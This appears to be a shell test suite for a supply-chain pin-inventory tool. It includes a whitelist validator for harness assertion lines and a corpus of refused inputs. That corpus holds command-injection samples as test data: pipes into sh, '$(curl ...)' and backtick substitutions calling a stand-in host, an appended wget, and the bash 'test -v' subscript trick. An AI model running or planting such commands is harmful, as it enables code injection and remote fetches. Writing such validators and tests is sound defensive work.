assert inv.unmeasured(wf("curl -fLO https://github.com/cli/cli/releases/download/v2.40.0/gh.tar.gz https://downloads.example/new-tool.tar.gz"))
assert inv.unmeasured(wf("curl -fLO https://mirror.example/github.com/cli/cli/releases/download/v2.40.0/gh.tar.gz"))
assert not inv.unmeasured(wf("curl -fLO https://github.com/cli/cli/releases/download/v2.40.0/gh.tar.gz"))
x = set(inv.inventory(wf("curl -L https://github.com/o/r/releases/download/v1.2.3/old.tgz -o x"))); y = set(inv.inventory(wf("curl -L https://github.com/o/r/releases/download/v1.2.3/new.tgz -o x")))
assert x != y
PY

CASE="an option chain of a thousand tokens before pip/docker is read in milliseconds (no regex backtracking), and docker global options with values (--context x) do not hide the subcommand"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys, time
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
t = time.time()
for body in ("pip" + " -a" * 1000 + " x", "docker" + " -a" * 1000 + " x", "python3 -m pip" + " -q" * 1000 + " install evilpkg==9.9.9"):
    inv.inventory({"bin/x.sh": body + "\n"})
assert time.time() - t < 2, time.time() - t
assert inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: docker --context x run evil/x:latest\n"})
PY

CASE="a hostile many-line file or a step that repeats one command hundreds of times is refused quickly (items and lines are bounded), and compound commands (cd x&&pip install y; a;pip install b) are read as separate commands"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys, time
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
t = time.time()
for files in ({"bin/x.sh": ("pip install " * 320 + "\n") * 100},
              {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: |\n" + "".join("          " + "pip install " * 320 + "\n" for _ in range(100))},
              {"bin/y.sh": "echo\n" * 30000}):
    try:
        inv.inventory(files)
    except RuntimeError:
        pass
    else:
        raise AssertionError("a hostile file was read")
assert time.time() - t < 5, time.time() - t
got = inv.inventory({"bin/x.sh": "cd x&&pip install foo==1.0\necho hi;pip install bar==2.0\n"})
assert "package:pypi/foo@1.0" in got and "package:pypi/bar@2.0" in got
PY

CASE="removing an installer action's version input leaves a (default) placeholder (refused)"
check python3 - "$here/../supply-chain/pin-inventory.py" "$work" <<'PY'
import importlib.util, sys, subprocess, os, json
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
mk = lambda w: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n" + w}
with_v = inv.inventory(mk("        with:\n          version: v2.13.2\n")); without = inv.inventory(mk(""))
assert [k for k in without if k not in with_v and "(default)" in k], sorted(without)
assert not [k for k in with_v if "(default)" in k]
PY

CASE="phase 2 R2 fixes: version FILES are items (their content is the key), a called workflow's input defaults and a local call's with: change the identity, a changed checksum on a download's step moves it, pip global options with values do not hide install, a second (default) step is its own key"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
assert set(inv.inventory({".python-version": "3.12\n"})) != set(inv.inventory({".python-version": "3.99.9\n"}))
callee = lambda v: {".github/workflows/callee.yml": "on:\n  workflow_call:\n    inputs:\n      lint-version:\n        default: " + v + "\njobs:\n  j:\n    steps:\n      - uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n        with:\n          version: ${{ inputs.lint-version }}\n"}
assert set(inv.inventory(callee("v2.13.2"))) != set(inv.inventory(callee("v9.99.9")))
caller = lambda v: {".github/workflows/caller.yml": "jobs:\n  c:\n    uses: ./.github/workflows/callee.yml\n    with:\n      lint-version: " + v + "\n"}
assert set(inv.inventory(caller("v2.13.2"))) != set(inv.inventory(caller("v9.99.9")))
dl = lambda sm: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: |\n          curl -L https://github.com/o/r/releases/download/v1.2.3/tool.tgz -o tool.tgz\n          echo " + sm + "  tool.tgz | sha256sum --check\n"}
assert set(inv.inventory(dl("a" * 64))) != set(inv.inventory(dl("b" * 64)))
assert inv.inventory({"bin/x.sh": "pip --timeout 60 install evil==9.9.9\n"}).get("package:pypi/evil@9.9.9")
d2 = inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - name: one\n        uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n      - name: two\n        uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n"})
assert len([k for k in d2 if "(default)" in k]) == 2
PY

CASE="bumping an action whose step also carries a placeholder (a checkout with fetch-tags: true, a (default) installer input) moves ONLY the action: the placeholder's identity does not contain the pin, and a boolean input is not an installer input"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
co = lambda sha: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: actions/checkout@" + sha + " # v7\n        with:\n          fetch-tags: true\n"}
a, b = inv.inventory(co("a" * 40)), inv.inventory(co("b" * 40))
assert [k for k in b if k not in a] == ["action:actions/checkout@" + "b" * 40], [k for k in b if k not in a]
assert not [k for k in a if "(input)" in k]
lint = lambda sha: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: golangci/golangci-lint-action@" + sha + " # v9\n"}
assert [k for k in inv.inventory(lint("b" * 40)) if k not in inv.inventory(lint("a" * 40))] == ["action:golangci/golangci-lint-action@" + "b" * 40]
PY

CASE="phase 2 R3 fixes: --isolated is a flag (install is not its value), a version file at any path is an item, two identical unresolved installer steps are two items, a checksum in ANY step of the job moves a download, a python/java/node SERIES (3.12, 21) is not an exact pin"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
assert inv.inventory({"bin/x.sh": "python3 -m pip --isolated install black==99.0.0\n"}).get("package:pypi/black@99.0.0")
assert set(inv.inventory({"config/.python-version": "3.12.1\n"})) != set(inv.inventory({"config/.python-version": "3.99.9\n"}))
two = lambda second: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n      - uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n" + second}
assert len([k for k in inv.inventory(two("")) if "(default)" in k]) == 2
sep = lambda sm: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: curl -L https://github.com/o/r/releases/download/v1.2.3/tool.tgz -o tool.tgz\n      - run: echo " + sm + "  tool.tgz | sha256sum --check\n"}
assert set(inv.inventory(sep("a" * 64))) != set(inv.inventory(sep("b" * 64)))
spec2 = importlib.util.spec_from_file_location("ac", sys.argv[1].replace("pin-inventory", "pin-age-check")); ac = importlib.util.module_from_spec(spec2); spec2.loader.exec_module(ac)
for name, ver in (("python", "3.12"), ("java", "21"), ("node", "22")):
    assert not ac.judge_item(inv.Item("tool", name, ver))[0], name
assert ac.judge_item(inv.Item("tool", "python", "3.12.4"))[0]
PY

CASE="phase 2 R5 fixes: repeated expression-valued installer steps are numbered, a checksum FILE's content moves a download, an env source key bound to an expression never prints its name"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
two = lambda v2: {".github/workflows/a.yml": "env:\n  LINT_V: v2.14.0\njobs:\n  j:\n    steps:\n      - uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n        with:\n          version: ${{ env.LINT_V }}\n      - uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n        with:\n          version: " + v2 + "\n"}
assert set(inv.inventory(two("v2.13.2"))) != set(inv.inventory(two("${{ env.LINT_V }}")))
assert len([k for k in inv.inventory(two("${{ env.LINT_V }}")) if "expression" in k]) == 2
cs = lambda c: {".github/policy/gh-checksums.txt": c * 64 + "  gh.tar.gz\n"}
assert set(inv.inventory(cs("a"))) != set(inv.inventory(cs("b")))
src = inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    env:\n      PRIVATE_DOWNLOAD_URL: ${{ secrets.PRIVATE_DOWNLOAD_URL }}\n    steps:\n      - run: echo hi\n"})
assert not any("private_download_url" in k.lower() for k in src), sorted(src)
PY

CASE="an image named localhost/... (no port) used by docker run/create with --pull=never is local to the job and is NOT an item (advisor 0203); a pull, a run without --pull=never, a container: or services: image, localhost:PORT/, localhostx/ and a mid-name localhost/ all stay items (a registry can answer for localhost; Codex #187)"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
step = lambda cmd: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + cmd + "\n"}
imgs = lambda files: [k for k in inv.inventory(files) if k.startswith("image:")]
D = "@sha256:" + "a" * 64
assert not imgs(step("docker run --pull=never --rm localhost/fa-production true")), "run --pull=never of a localhost/ image is local"
assert not imgs(step("docker create --pull never localhost/fa-debug:latest")), "create --pull never too"
assert imgs(step("docker run --rm localhost/fa-production true")), "a run without --pull=never may pull"
assert imgs(step("docker pull localhost/x" + D)), "a pull downloads from a registry named localhost"
assert imgs(step("docker run --pull=always localhost/x" + D)), "--pull=always downloads"
assert imgs(step("docker run --pull=never localhost:5000/fa-production:1 true")), "localhost:PORT is a registry"
assert imgs(step("docker run --pull=never localhostx/fa-production:1 true")), "a name that only starts with localhost is not local"
assert imgs(step("docker run --pull=never registry.example/localhost/fa:1 true")), "localhost/ in the middle of a name is not local"
assert imgs(step("docker run --pull=never --pull=always localhost/x" + D + " true")), "the LAST --pull wins: always downloads"
assert not imgs(step("docker run --pull=always --pull=never localhost/fa-x true")), "the last --pull is never: local"
assert imgs(step("docker run --pull=never --pull=always localhost/fa-x true")), "the last --pull is always: a tag-only localhost/ image is an item"
assert not imgs(step("podman run --pull never localhost/fa-x true")), "podman and a separate value too"
assert imgs(step("docker pull --pull=never localhost/fa-x")), "docker pull is never exempt (tag-only form: no digest scan to mask a mistake)"
assert imgs(step("docker run localhost/x" + D + " --pull=never")), "a --pull after the image operand is the container's argument, not a policy"
assert imgs(step("docker run --label x --pull always localhost/x" + D + " true")), "--pull always as a separate value downloads"
assert imgs(step("docker pull --pull=never localhost/x" + D)), "docker pull never exempts"
assert imgs(step("docker run --label=--pull=never localhost/x" + D + " true")), "a quoted/attached option VALUE that spells --pull=never is not a policy"
# tag-only forms (no digest scan to mask a mistake): one parser for the policy and the image (Codex #187 round 3)
assert imgs(step("docker run --pull=never --cpu-period 100000 --pull=always localhost/fa-x true")), "a numeric option value before the last --pull"
assert imgs(step("docker run --pull=never --label \"description=hello world\" --pull=always localhost/fa-x true")), "a quoted option value with a space before the last --pull"
assert not imgs(step("docker run --cpu-period 100000 --pull=never localhost/fa-x true")), "a numeric option value before --pull=never stays local"
assert not imgs(step("docker run --label \"description=hello world\" --pull=never localhost/fa-x true")), "a quoted value before --pull=never stays local"
assert imgs(step("docker run localhost/fa-x --pull=never")), "a --pull after the image operand is the container's argument (tag-only)"
assert imgs(step("docker run --name --pull=never localhost/fa-x true")), "an option's value that spells --pull=never is not a policy (tag-only)"
assert imgs(step("docker run --pull=always --rm 123 --pull=never localhost/fa-x")), "a boolean flag does not take the next word: 123 is the operand, the rest are container arguments (Codex #187 round 4)"
assert imgs(step("docker run --frobnicate 5 --pull=never localhost/fa-x true")), "an option of unknown arity withholds the exemption"
assert not imgs(step("docker run -d --rm --init --pull=never localhost/fa-x true")), "known booleans and a known cluster stay local"
assert not imgs(step("docker run -dit --pull=never localhost/fa-x true")), "a short cluster of booleans is known"
assert not imgs(step("docker run --memory=512m --pull=never localhost/fa-x true")), "--name=value of a known value option is known"
sh = {"bin/check.sh": "docker run --pull=never --label \"a b\" --pull=always localhost/fa-x" + D + " true\n"}
assert imgs(sh), "the same in a script"
assert imgs(step("docker run --name --pull=never localhost/x" + D + " true")), "an option's value that spells --pull=never is not a policy"
cs = {".github/workflows/a.yml": "jobs:\n  j:\n    container: localhost/fa-x\n    services:\n      s:\n        image: localhost/fa-y\n    steps:\n      - uses: docker://localhost/fa-z" + D + "\n"}
assert len(imgs(cs)) == 3, imgs(cs)           # container:, services: and uses: docker:// pull their images
PY

# --- REQ-SUP-001-AC16, the second allowed row form (advisor, Oct 10): a HARNESS ASSERTION LINE. Its whole grammar is ONE data structure, HARNESS_WHITELIST in
# harness_form.py below (the allowed characters, shape, command words, separators, test operators, grep options, exit statuses, argument names and paths,
# substitutions and double-quoted pattern characters); anything it does not name is refused. In short: t "RULE" "TITLE" bash -c 'BODY' _ "$work/.." "$CALLS"..
# with no expansion of any kind in RULE or TITLE, a SINGLE-QUOTED body (Codex R1) that names the paths only as whole "$1".."$9", no character outside
# printable ASCII and tab (Sonnet R1: a newline), and test / [ limited to file tests, = / != and count comparisons (Sonnet R1: bash 5 evaluates $(...) in
# -v, -R and arithmetic operands). harness_form.py decides a line (exit 0 'harness assertion', exit 1 'refused: why'; --file F reads it from a file).
# Proofs: each refused variant is its own case; the complement enumeration (hf_enum.py) puts every token class outside the whitelist in every position it can
# take; the mutation run widens the whitelist by one token at a time and requires the enumeration to catch it; the runtime proof executes the corpus under
# every bash on PATH (5.x and, where present, 3.2) with a marker-writing curl stub, with plain and hostile argument values.
cat >"$work/harness_form.py" <<'PY'
import re, sys
ALNUM = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
# HARNESS_WHITELIST: the WHOLE grammar of a ruled harness assertion line (REQ-SUP-001-AC16, second row form). Everything not named here is refused.
HARNESS_WHITELIST = {
    "line_chars": "".join(chr(c) for c in range(0x20, 0x7F)) + "\t",   # the line holds only these (no newline, CR, control or non-ASCII character)
    "shape": "t \"RULE\" \"TITLE\" bash -c 'BODY' _ ARG...",          # optional leading spaces; ARG... is zero to nine path arguments
    "rule_title_chars": ALNUM + " :-.(),=",                            # RULE and TITLE: no expansion of any kind (no $, backtick, backslash, quote)
    "arg_names": ["work", "CALLS"],                                    # an ARG is "$NAME" or "$NAME/SEG/..." with NAME from this list
    "arg_path_chars": ALNUM + "_.-",                                   # SEG: one or more of these
    "max_args": 9,
    "separators": ["&&", "||", "|", ";"],                              # between the commands of BODY
    "negation": ["!"],                                                 # may precede a command, or a test expression
    "commands": ["grep", "test", "[", "cat", "exit"],                  # the command words of BODY, unquoted
    "pipe_into": ["grep"],                                             # the only command after a |
    "grep_options": ["-E", "-q", "-v", "-Eq"],                         # grep's options: bare words, before end_of_options
    "end_of_options": "--",                                            # REQUIRED: grep OPTION... -- PATTERN ["$N"...] and cat -- "$N" (an operand never reads as an option)
    "pattern_first_char_not": "-",                                     # a double-quoted grep pattern may not start with this
    "grep_bare_patterns": ["."],                                       # the only unquoted grep pattern
    "test_unary": ["-f", "-s", "-e", "-d", "-r"],                      # test / [ : OP X
    "test_string": ["=", "!="],                                        # test / [ : X OP Y
    "test_count": ["-eq", "-ne", "-lt", "-le", "-gt", "-ge"],          # test / [ : N OP N, N = plain digits or the grep count substitution
    "exit_status": ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"],  # exit takes exactly one of these
    "positional": "\"$1\" .. \"$9\", whole, at most the number of ARGs", # how BODY names a path: grep's file operands, cat's one operand
    "substitutions": {"grep": "-c", "cat": ""},                        # "$(grep -c OPTION... -- PATTERN "$N")" (a count) and "$(cat -- "$N")", whole and double-quoted
    "dquote_chars": ALNUM + " ^.*:/|()=-",                             # inside a double-quoted BODY word (a pattern)
    "dquote_escapes": ["\\.", "\\[", "\\]"],                         # the only backslash sequences inside a double-quoted BODY word
}
# END HARNESS_WHITELIST
W = HARNESS_WHITELIST
GSUB, CSUB = "\x01G", "\x01C"                              # placeholders: a character outside line_chars can never come from an accepted line
class Refused(Exception): pass
def cls(chars): return "[" + "".join(re.escape(c) for c in chars) + "]"
DQ = '"(?:' + "|".join([cls(W["dquote_chars"])] + [re.escape(e) for e in W["dquote_escapes"]]) + ')*"'
PAT = ('"(?!' + re.escape(W["pattern_first_char_not"]) + ')' + DQ[1:]) if W["pattern_first_char_not"] else DQ   # a pattern word: no leading option character
EOO = (" +" + re.escape(W["end_of_options"])) if W["end_of_options"] else ""
POS = r'"\$([1-9])"'
def alt(xs): return "(?:" + "|".join(re.escape(x) for x in sorted(xs, key=len, reverse=True)) + ")"
SUBS = []
for cmd, lead in W["substitutions"].items():
    extra = ("(?: +" + alt(W["grep_options"]) + ")*" + EOO + " +(?:" + alt(W["grep_bare_patterns"]) + "|" + PAT + ")") if cmd == "grep" else EOO
    SUBS.append((re.compile(r'"\$\(' + re.escape(cmd) + ((" " + re.escape(lead)) if lead else "") + extra + r' "\$([1-9])"\)"'), GSUB if cmd == "grep" else CSUB))
SHAPE = re.compile(r' *t "(' + cls(W["rule_title_chars"]) + r'*)" "(' + cls(W["rule_title_chars"]) + r'*)" bash -c \'([^\']*)\' _((?: +"[^"]*")*)')
ARG = re.compile(r'"\$' + alt(W["arg_names"]) + r'(?:/' + cls(W["arg_path_chars"]) + r'+)*"')
def tokens(body):                                          # [("sep", s)] or [("word", text, kind)]; kind: bare, dq, pos, gsub, csub
    out, i, n = [], 0, len(body)
    seps = sorted(W["separators"], key=len, reverse=True)
    while i < n:
        if body[i] in " \t": i += 1; continue
        s = next((s for s in seps if body.startswith(s, i)), None)
        if s: out.append(("sep", s)); i += len(s); continue
        j = i
        while j < n and body[j] not in " \t" and not any(body.startswith(s, j) for s in seps):
            if body[j] == '"':
                k = body.find('"', j + 1)
                if k < 0: raise Refused("an unterminated double quote in the body")
                j = k + 1
            else: j += 1
        w = body[i:j]; i = j
        if '"' not in w: out.append(("word", w, "bare")); continue
        if not (len(w) >= 2 and w[0] == '"' and w[-1] == '"' and '"' not in w[1:-1]): raise Refused(f"the word {w!r} mixes quoted and unquoted text")
        if w == '"' + GSUB + '"': out.append(("word", w, "gsub")); continue
        if w == '"' + CSUB + '"': out.append(("word", w, "csub")); continue
        m = re.fullmatch(POS, w)
        if m: out.append(("word", m.group(1), "pos")); continue
        if not re.fullmatch(DQ, w): raise Refused(f"the double-quoted word {w!r} holds a character or escape outside dquote_chars / dquote_escapes")
        out.append(("word", w, "dq"))
    return out
def test_expr(args):
    while args and args[0][2] == "bare" and args[0][1] in W["negation"]: args = args[1:]
    operand = lambda a: a[2] in ("dq", "pos", "gsub", "csub") or (a[2] == "bare" and re.fullmatch(r"[0-9]+", a[1]))
    count = lambda a: a[2] == "gsub" or (a[2] == "bare" and re.fullmatch(r"[0-9]+", a[1]))
    if len(args) == 2 and args[0][2] == "bare" and args[0][1] in W["test_unary"] and args[1][2] == "pos": return   # a file test names a positional "$N" only
    if len(args) == 3 and args[1][2] == "bare" and args[1][1] in W["test_string"] and operand(args[0]) and operand(args[2]): return
    if len(args) == 3 and args[1][2] == "bare" and args[1][1] in W["test_count"] and count(args[0]) and count(args[2]): return
    raise Refused("a test / [ expression outside test_unary (on a positional \"$N\"), test_string and test_count (with their operands)")
def judge(line):
    bad = [c for c in line if c not in W["line_chars"]]
    if bad: raise Refused(f"a character outside the line character set ({bad[0]!r}): bash may read the line differently")
    m = SHAPE.fullmatch(line)
    if not m: raise Refused("not the shape t \"RULE\" \"TITLE\" bash -c 'BODY' _ ARG... (or a RULE / TITLE character outside rule_title_chars)")
    args = re.findall(r' +("[^"]*")', m.group(4))
    if len(args) > W["max_args"]: raise Refused("more path arguments than max_args")
    for a in args:
        if not ARG.fullmatch(a): raise Refused(f"the argument {a} is not \"$NAME\" or \"$NAME/SEG...\" with NAME in arg_names")
    body = m.group(3)
    for rx, ph in SUBS:
        for mm in rx.finditer(body):
            if int(mm.group(1)) > len(args): raise Refused(f"${mm.group(1)} names no argument")
        body = rx.sub('"' + ph + '"', body)
    cmds, cur, seps = [], [], []
    for t in tokens(body):
        if t[0] == "sep": cmds.append(cur); seps.append(t[1]); cur = []
        else: cur.append(t)
    cmds.append(cur)
    for k, c in enumerate(cmds):
        for t in c:
            if t[2] == "pos" and int(t[1]) > len(args): raise Refused(f"${t[1]} names no argument")
        while c and c[0][2] == "bare" and c[0][1] in W["negation"]: c = c[1:]
        if not c: raise Refused("an empty command")
        word, kind, rest = c[0][1], c[0][2], c[1:]
        if kind != "bare" or word not in W["commands"]: raise Refused(f"the command word {word!r} is not in commands (unquoted)")
        if k and seps[k - 1] == "|" and word not in W["pipe_into"]: raise Refused(f"a pipe into {word!r} (pipe_into)")
        if word == "grep":                                 # grep OPTION... -- PATTERN ["$N"...], each word in its role
            i = 0
            while i < len(rest) and rest[i][2] == "bare" and rest[i][1] in W["grep_options"]: i += 1
            if W["end_of_options"]:
                if i >= len(rest) or rest[i][2] != "bare" or rest[i][1] != W["end_of_options"]:
                    raise Refused(f"grep needs its options from grep_options, then {W['end_of_options']} before the pattern (a quoted word is never an option)")
                i += 1
            if i >= len(rest): raise Refused("grep has no pattern")
            p = rest[i]
            if not ((p[2] == "bare" and p[1] in W["grep_bare_patterns"]) or (p[2] == "dq" and not (W["pattern_first_char_not"] and p[1][1:].startswith(W["pattern_first_char_not"])))):
                raise Refused(f"the grep pattern {p[1]!r} is not a double-quoted word that does not start with {W['pattern_first_char_not']!r}, or a bare pattern from grep_bare_patterns")
            for a in rest[i + 1:]:
                if a[2] != "pos": raise Refused(f"the grep file operand {a[1]!r} is not a positional \"$N\"")
        elif word == "test": test_expr(rest)
        elif word == "[":
            if not rest or rest[-1][2] != "bare" or rest[-1][1] != "]": raise Refused("[ without its closing ]")
            test_expr(rest[:-1])
        elif word == "cat":                                # cat -- "$N"
            want = ([("bare", W["end_of_options"])] if W["end_of_options"] else []) + [("pos",)]
            if len(rest) != len(want) or any(a[2] != w[0] or (w[0] == "bare" and a[1] != w[1]) for a, w in zip(rest, want)):
                raise Refused(f"cat takes exactly {W['end_of_options'] + ' ' if W['end_of_options'] else ''}and one positional")
        elif word == "exit":
            if len(rest) != 1 or rest[0][2] != "bare" or rest[0][1] not in W["exit_status"]: raise Refused("exit takes exactly one exit_status")
        else:
            for a in rest:
                if a[2] not in ("dq", "pos"): raise Refused(f"the argument {a[1]!r} is not a double-quoted word or a positional")
def main():
    try:
        judge(open(sys.argv[2], encoding="utf-8", errors="surrogateescape", newline="").read() if sys.argv[1] == "--file" else sys.argv[1])
    except Refused as e:
        print("refused: " + str(e)); sys.exit(1)
    print("harness assertion: runs nothing but grep, test, cat and exit <digit>"); sys.exit(0)
if __name__ == "__main__":
    main()
PY
hf() { rc=0; python3 "$work/harness_form.py" "$1" >"$work/hf.out" 2>&1 || rc=$?; }
hff() { rc=0; python3 "$work/harness_form.py" --file "$1" >"$work/hf.out" 2>&1 || rc=$?; }
cat >"$work/hf-refused.tsv" <<'EOF'
a pipe into sh	t "r" "x" bash -c 'grep -q a "$1" | sh' _ "$CALLS"
a pipe into bash	t "r" "x" bash -c 'cat "$1" | bash' _ "$CALLS"
an output redirection >	t "r" "x" bash -c 'grep a "$1" > out' _ "$CALLS"
an output redirection >>	t "r" "x" bash -c 'grep a "$1" >> out' _ "$CALLS"
an input redirection <	t "r" "x" bash -c 'grep a < "$1"' _ "$CALLS"
$(curl ...) in the body	t "r" "x" bash -c 'test "$(curl -s https://e.example/x)" = 1' _
$(...) of another command in the body	t "r" "x" bash -c 'test "$(ls)" = 1' _
an unquoted $(grep -c ...) in the body	t "r" "x" bash -c 'test $(grep -c a "$1") -ge 1' _ "$CALLS"
a pipe inside $(grep -c ...)	t "r" "x" bash -c 'test "$(grep -c a "$1" | sh)" -ge 1' _ "$CALLS"
a substitution inside $(cat ...)	t "r" "x" bash -c 'test "$(cat $(curl -s https://e.example/x))" = 1' _
$(cat ...) of a literal path, not a positional argument	t "r" "x" bash -c 'test "$(cat f)" = 1' _
$(grep -c ...) on a literal path, not a positional argument	t "r" "x" bash -c 'test "$(grep -c a f)" -ge 1' _
a process substitution in the body	t "r" "x" bash -c 'grep a <(cat "$1")' _ "$CALLS"
a substitution the outer shell runs, in the title	t "r" "x $(curl -s https://e.example/x)" bash -c 'grep a "$1"' _ "$CALLS"
a substitution the outer shell runs, in the rule label	t "r $(curl -s https://e.example/x)" "x" bash -c 'grep a "$1"' _ "$CALLS"
a substitution the outer shell runs, in an argument	t "r" "x" bash -c 'grep a "$1"' _ "$(curl -s https://e.example/x)"
backticks in the body	t "r" "x" bash -c 'test "`curl -s https://e.example/x`" = 1' _
backticks in the title	t "r" "x `curl -s https://e.example/x`" bash -c 'grep a "$1"' _ "$CALLS"
a command word outside the vocabulary (curl)	t "r" "x" bash -c 'curl -s https://e.example/x' _
a quoted command word	t "r" "x" bash -c '"grep" a "$1"' _ "$CALLS"
a variable as the command word	t "r" "x" bash -c '$G a "$1"' _ "$CALLS"
a positional argument as the command word	t "r" "x" bash -c '"$1" a' _ "$CALLS"
eval	t "r" "x" bash -c 'eval "grep a f"' _
source	t "r" "x" bash -c 'source "$1"' _ "$CALLS"
a second bash -c	t "r" "x" bash -c 'bash -c "grep a f"' _
a ;-separated extra command (wget)	t "r" "x" bash -c 'grep a "$1"; wget https://e.example/x' _ "$CALLS"
exit with a variable status	t "r" "x" bash -c 'grep a "$1" && exit $x' _ "$CALLS"
exit with a positional status	t "r" "x" bash -c 'grep a "$1" && exit "$1"' _ "$CALLS"
exit with no status	t "r" "x" bash -c 'grep a "$1" && exit' _ "$CALLS"
exit with two arguments	t "r" "x" bash -c 'grep a "$1" && exit 1 2' _ "$CALLS"
exit with a negative status	t "r" "x" bash -c 'grep a "$1" && exit -1' _ "$CALLS"
exit with two digits	t "r" "x" bash -c 'grep a "$1" && exit 10' _ "$CALLS"
exit with a quoted status	t "r" "x" bash -c 'grep a "$1" && exit "1"' _ "$CALLS"
a quoted exit	t "r" "x" bash -c 'grep a "$1" && "exit" 1' _ "$CALLS"
a background &	t "r" "x" bash -c 'grep a "$1" & curl https://e.example/x' _ "$CALLS"
a subshell	t "r" "x" bash -c '(curl https://e.example/x)' _
cat with an option	t "r" "x" bash -c 'cat -v "$1"' _ "$CALLS"
cat of two files	t "r" "x" bash -c 'cat "$1" "$1"' _ "$CALLS"
a pipe into anything but grep (tee)	t "r" "x" bash -c 'cat "$1" | tee g' _ "$CALLS"
not the t function	run "r" "x" bash -c 'grep a "$1"' _ "$CALLS"
an unquoted title	t "r" x bash -c 'grep a "$1"' _ "$CALLS"
no rule label	t "x" bash -c 'grep a "$1"' _ "$CALLS"
an empty command between operators	t "r" "x" bash -c 'grep a "$1" && && grep b "$1"' _ "$CALLS"
Codex R1 reproduction: a DOUBLE-quoted body with an outer variable (its value is spliced into the code)	t "r" "x" bash -c "grep -q a '$CALLS'"
a double-quoted body even with no variable	t "r" "x" bash -c "grep -q a f" _
no _ after the body	t "r" "x" bash -c 'grep a "$1"' "$CALLS"
a $0 other than _	t "r" "x" bash -c 'grep a "$1"' x "$CALLS"
an unquoted word after the body	t "r" "x" bash -c 'grep a "$1"' _ curl
a second body after the arguments	t "r" "x" bash -c 'grep a "$1"' _ "$CALLS" bash -c 'curl https://e.example/x'
an argument variable outside the allowlist	t "r" "x" bash -c 'grep a "$1"' _ "$HOME"
an argument with two variables	t "r" "x" bash -c 'grep a "$1"' _ "$work$CALLS"
an argument written ${work}	t "r" "x" bash -c 'grep a "$1"' _ "${work}/rc"
an argument with a variable in the path	t "r" "x" bash -c 'grep a "$1"' _ "$work/$x"
an argument with a glob	t "r" "x" bash -c 'grep a "$1"' _ "$work/*"
a single-quoted argument	t "r" "x" bash -c 'grep a "$1"' _ '$CALLS'
an unquoted argument	t "r" "x" bash -c 'grep a "$1"' _ $CALLS
a literal argument	t "r" "x" bash -c 'grep a "$1"' _ "f"
a positional beyond the arguments	t "r" "x" bash -c 'grep a "$2"' _ "$CALLS"
an unquoted positional	t "r" "x" bash -c 'grep a $1' _ "$CALLS"
"$@" in the body	t "r" "x" bash -c 'grep a "$@"' _ "$CALLS"
"${1}" in the body	t "r" "x" bash -c 'grep a "${1}"' _ "$CALLS"
"$10" in the body	t "r" "x" bash -c 'grep a "$10"' _ "$CALLS"
a positional inside a longer word	t "r" "x" bash -c 'grep a "$1/x"' _ "$CALLS"
a positional glued to another word	t "r" "x" bash -c 'grep a "$1"x' _ "$CALLS"
an inner variable in a double-quoted word	t "r" "x" bash -c 'grep "$HOME" "$1"' _ "$CALLS"
an escaped quote in a double-quoted word	t "r" "x" bash -c 'grep "a\"b" "$1"' _ "$CALLS"
an escaped dollar in a double-quoted word	t "r" "x" bash -c 'grep "a\$b" "$1"' _ "$CALLS"
an unquoted backslash	t "r" "x" bash -c 'grep a\ b "$1"' _ "$CALLS"
Sonnet R1 reproduction 2 (new form): test -v with a literal $(...) array subscript (bash 5 evaluates it)	t "r" "x" bash -c 'test -v "a[\$(curl -s https://e.example/x)]"' _
test -v "a[$(touch X)]" (the substitution runs at expansion)	t "r" "x" bash -c 'test -v "a[$(touch X)]"' _
test -v on a positional argument (its value would be the subscript)	t "r" "x" bash -c 'test -v "$1"' _ "$CALLS"
[ -v "x[$(cmd)]" ]	t "r" "x" bash -c '[ -v "x[$(cmd)]" ]' _
[ -R "x[$(cmd)]" ]	t "r" "x" bash -c '[ -R "x[$(cmd)]" ]' _
